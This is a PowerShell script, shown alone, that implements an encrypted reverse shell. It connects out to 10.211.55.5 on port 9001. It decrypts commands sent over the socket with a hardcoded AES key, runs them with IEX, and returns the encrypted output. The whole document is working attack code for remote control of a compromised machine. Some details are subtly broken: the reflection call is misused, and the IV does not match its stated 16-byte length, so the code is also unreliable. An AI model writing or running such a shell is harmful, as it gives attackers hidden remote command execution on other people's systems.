$u = "10.211.55.5"; $p = 9001;
$r = [System.Reflection.Assembly]::GetType("System.Net.Sockets.TcpClient");
$c = $r::new();
$c.Connect($u,$p); $s = $c.GetStream();
$AES = New-Object System.Security.Cryptography.AesManaged;
$AES.Key = [System.Convert]::FromBase64String("AAECAwQFBgcICQoLDA0ODw=="); # 16-byte key
$AES.IV = [System.Convert]::FromBase64String("AAECAwQFBgcICQoLDA0O"); # 16-byte IV
$E = $AES.CreateEncryptor();
$D = $AES.CreateDecryptor();
$e = New-Object System.Text.UTF8Encoding;
$w = New-Object System.IO.StreamWriter($s);
$r = New-Object System.IO.StreamReader($s);

function E-Invoke($cmd) {
    $m = New-Object System.IO.MemoryStream;
    $c = New-Object System.Security.Cryptography.CryptoStream($m,$E,[System.Security.Cryptography.CryptoStreamMode]::Write);
    $b = $e.GetBytes($cmd);
    $c.Write($b,0,$b.Length); $c.FlushFinalBlock();
    $r = [System.Convert]::ToBase64String($m.ToArray());
    return $r;
}

function D-Invoke($encCmd) {
    $m = New-Object System.IO.MemoryStream;
    $b = [System.Convert]::FromBase64String($encCmd);
    $m.Write($b,0,$b.Length); $m.Position=0;
    $c = New-Object System.Security.Cryptography.CryptoStream($m,$D,[System.Security.Cryptography.CryptoStreamMode]::Read);
    $sr = New-Object System.IO.StreamReader($c);
    $r = $sr.ReadToEnd();
    return $r;
}

while ($true) {
    $encData = $r.ReadLine();
    if ($encData -eq "exit") { break; }
    $data = D-Invoke $encData;
    $res = (IEX $data 2>&1 | Out-String);
    $encRes = E-Invoke $res;
    $w.WriteLine($encRes); $w.Flush();
}
$c.Close();
